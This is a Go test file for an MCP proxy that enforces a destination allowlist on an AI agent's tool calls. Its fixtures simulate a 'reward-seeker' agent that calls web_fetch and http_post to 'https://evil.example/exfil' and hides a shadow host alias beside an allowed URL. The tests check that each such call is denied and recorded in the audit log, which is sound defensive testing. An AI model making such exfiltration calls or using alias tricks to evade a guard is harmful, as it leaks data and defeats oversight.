package proxy

import (
	"bytes"
	"path/filepath"
	"strings"
	"testing"

	"github.com/themayursinha/mcp-visor/internal/audit"
	"github.com/themayursinha/mcp-visor/internal/mcp"
)

func rewardSeekerYAML() string {
	return `
version: "1.0"
description: "Read local tickets; do not post to an unlisted host"
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: low
      - name: "http_post"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
      - name: "web_fetch"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
`
}

func TestDestinationProxyDeniesExpandingHostBeforeRelay(t *testing.T) {
	auditPath := filepath.Join(t.TempDir(), "audit.jsonl")
	p := New(Config{
		ServerName:   "workspace",
		SessionID:    "sess-reward-seeker",
		ClientID:     "agent-reward",
		AuditLogPath: auditPath,
		Policy:       mustLoadPolicy(t, rewardSeekerYAML()),
	})
	defer p.audit.Close()

	out := &bytes.Buffer{}
	client := mcp.NewParser(nil, out)

	_, action := p.interceptAndModify(toolCallRaw(1, "file_read", map[string]any{
		"path": "/workspace/tickets.md",
	}), client)
	if action != "forward" {
		t.Fatalf("legitimate local read must forward, got %s; response=%s", action, out.String())
	}

	out.Reset()
	_, action = p.interceptAndModify(toolCallRaw(2, "http_post", map[string]any{
		"url": "https://docs.internal/api",
	}), client)
	if action != "forward" {
		t.Fatalf("mandated host must forward, got %s; response=%s", action, out.String())
	}

	out.Reset()
	_, action = p.interceptAndModify(toolCallRaw(3, "web_fetch", map[string]any{
		"url": "https://evil.example/exfil",
	}), client)
	if action != "denied" {
		t.Fatalf("web_fetch to evil.example must deny before relay, got %s; response=%s", action, out.String())
	}
	if !strings.Contains(out.String(), "authority-expanding destination") {
		t.Fatalf("denial must name authority-expanding destination, got %s", out.String())
	}

	if err := p.audit.Close(); err != nil {
		t.Fatalf("close audit: %v", err)
	}
	denied := findAuditEvent(t, auditPath, audit.EventToolDenied, "web_fetch")
	if denied.Decision != "deny" {
		t.Fatalf("expected deny decision in audit, got %+v", denied)
	}
	for _, token := range []string{
		"argument class URL",
		"effect class NETWORK",
		"authority transition MANDATE->EGRESS",
	} {
		if !strings.Contains(denied.Reason, token) {
			t.Fatalf("audit reason missing evidence %q: %+v", token, denied)
		}
	}
}

func TestDestinationProxyDeniesShadowAliasBeforeRelay(t *testing.T) {
	auditPath := filepath.Join(t.TempDir(), "audit.jsonl")
	p := New(Config{
		ServerName:   "workspace",
		SessionID:    "sess-reward-alias",
		ClientID:     "agent-reward",
		AuditLogPath: auditPath,
		Policy:       mustLoadPolicy(t, rewardSeekerYAML()),
	})
	defer p.audit.Close()

	out := &bytes.Buffer{}
	client := mcp.NewParser(nil, out)
	_, action := p.interceptAndModify(toolCallRaw(1, "http_post", map[string]any{
		"url":  "https://docs.internal/api",
		"host": "evil.example",
	}), client)
	if action != "denied" {
		t.Fatalf("shadow host alias must deny before relay, got %s; response=%s", action, out.String())
	}
}

func TestDestinationProxyHistoryDoesNotAuthorizeHost(t *testing.T) {
	auditPath := filepath.Join(t.TempDir(), "audit.jsonl")
	p := New(Config{
		ServerName:   "workspace",
		SessionID:    "sess-reward-history",
		ClientID:     "agent-reward",
		AuditLogPath: auditPath,
		Policy:       mustLoadPolicy(t, rewardSeekerYAML()),
	})
	defer p.audit.Close()

	out := &bytes.Buffer{}
	client := mcp.NewParser(nil, out)
	for id := 1; id <= 2; id++ {
		out.Reset()
		_, action := p.interceptAndModify(toolCallRaw(id, "http_post", map[string]any{
			"url": "https://evil.example/exfil",
		}), client)
		if action != "denied" {
			t.Fatalf("call %d: repeated expanding dest must stay denied, got %s", id, action)
		}
	}
	out.Reset()
	_, action := p.interceptAndModify(toolCallRaw(3, "http_post", map[string]any{
		"url": "https://docs.internal/api",
	}), client)
	if action != "forward" {
		t.Fatalf("mandated host must still forward after denials, got %s; response=%s", action, out.String())
	}
}
